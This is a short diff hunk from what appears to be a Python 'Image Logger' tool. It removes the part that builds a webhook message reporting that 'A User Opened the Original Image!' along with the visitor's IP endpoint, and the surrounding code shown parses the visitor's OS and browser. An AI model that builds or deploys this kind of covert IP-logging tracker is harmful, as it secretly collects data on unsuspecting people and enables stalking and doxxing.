@@ -139,14 +139,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     os, browser = httpagentparser.simple_detect(useragent)
     
-    embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+
 
 **Endpoint:** `{endpoint}`
             
